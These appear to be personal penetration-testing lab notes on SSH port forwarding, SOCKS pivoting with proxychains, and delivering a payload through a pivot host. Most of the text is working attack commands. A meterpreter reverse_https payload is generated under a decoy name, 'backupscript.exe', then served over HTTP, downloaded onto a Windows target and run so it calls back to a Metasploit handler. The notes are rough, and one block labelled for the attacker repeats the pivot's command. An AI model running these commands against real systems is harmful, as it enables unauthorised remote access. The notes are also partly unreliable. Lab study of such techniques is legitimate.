Local Port Forwarding using `ssh`
```

ssh -L <any-port-attacker>:localhost:<service-port on victim ex:mysql> user@serverB`
```
tell victim to redirect any traffic coming from local port 3306 to port 3000 on attacker

### AD ENV
Remote portforwarding so pivot host can redirect tool traffic:
```
ssh  -D 1080 -R 8000:172.16.8.120:8000 -i root_private_key root@10.129.116.185
```


## Forwarding Multiple Local Ports

Dynamic Port Forwarding with SSH and SOCKS Tunneling LOCAL!

```shell-session
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```
## Remote Port forwarding using ssh + Tunneling with socks4
you cant set both at the same time, set 1 step at a time.
1. tunnel
```
ssh -N -D 1080 root@ip
```
now when you're scanning connect scan -sT as proxychains interfere with the results of nmap and return inconrrect results if you send half packets (default is -sS half packets)
```shell-session
 proxychains nmap -v -Pn -sT 172.16.5.19
```
remote forward
```shell-session
$ ssh -i dmz01_key -R 172.16.8.120:443:0.0.0.0:7000 root@10.129.203.111 -vN

debug1: Remote connections from 172.16.8.120:443 forwarded to local address 0.0.0.0:7000 (log refers to attacker's local address in this situation)
```

ssh remote portforward (BUGGY with -D OPTION CANT BE USED SAME T)
```
# ----- set variables -----
PIVOT_IP=172.16.8.120 #IP connected to internal network
PIVOT_EXTERNALIP=10.129.116.185 # IP  attacker can reach
ATTACKER_IP=10.10.16.42

PIVOT_USER=root

# port that will be listened on the pivot (where traffic arrives)
PIVOT_PORT=8000

# port on the attacker that the traffic will be forwarded to
ATTACKER_PORT=8000

# ----- reverse tunnel: run this on the ATTACKER -----
# pivot will bind 0.0.0.0:${PIVOT_PORT} and forward to attacker:${ATTACKER_PORT}
ssh  -N  -R 0.0.0.0:${PIVOT_PORT}:127.0.0.1:${ATTACKER_PORT} ${PIVOT_USER}@${PIVOT_EXTERNALIP}

```
Requires `GatewayPorts clientspecified` or `yes` on the pivot's `sshd_config`. `-N` keeps it as tunnel only. Use `-f` or `autossh` to background/persist.

---

  Remote/Reverse Port Forwarding with SSH
  ```shell-session
# Tell victim server to forward any traffic coming to it to me
ssh -N -R 0.0.0.0:1337:127.0.0.1:1337 pivot_user@172.16.8.120

```



---

1) Attacker → Pivot (reverse SSH) — **run on attacker**

Makes the **pivot listen** on `172.16.8.120:8000` and forward connections to `attacker:8000`.
```
# on pivot (172.16.8.120)
ssh -N -L 172.16.8.120:8000:127.0.0.1:8000 attacker_user@10.10.16.42

```



2) Pivot → Attacker (pivot creates local forward) — **run on pivot**

Pivot binds `172.16.8.120:8000` and forwards into the attacker SSH server at `10.10.16.42:8000`
```
# on pivot (172.16.8.120)
ssh -N -L 172.16.8.120:8000:127.0.0.1:8000 attacker_user@10.10.16.42

```

## Reverse Port Forwarding

------------------------
![[Screenshots/Pasted image 20250110221008.png]]
#### Creating a Windows Payload with msfvenom

  Remote/Reverse Port Forwarding with SSH

```shell-session
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080

Saved as: backupscript.exe
```


#### Configuring & Starting the multi/handler

```shell-session
msf6 > use exploit/multi/handler

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
lport => 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```

#### Transferring Payload to Pivot Host

```shell-session
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/

backupscript.exe                                   100% 7168    65.4KB/s   00:00 
```

After copying the payload, we will start a `python3 HTTP server` using the below command on the Ubuntu server in the same directory where we copied our payload.

-------------------------------------------------
### Serving Reverse shell to victim via web server

  Remote/Reverse Port Forwarding with SSH
  ```shell-session
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
example

```
  
  Remote/Reverse Port Forwarding with SSH

```shell-session
 python3 -m http.server 8123
```

#### Downloading Payload on the Windows Target

```powershell-session
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```


 listen on `<targetIPaddress>:8080` and forward all incoming connections on port `8080` to our msfconsole listener on `0.0.0.0:8000` of our `attack host`

```shell-session
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
example

```

After creating the SSH remote port forward, we can execute the payload from the Windows target. If the payload is executed as intended and attempts to connect back to our listener, we can see the logs from the pivot on the pivot host.





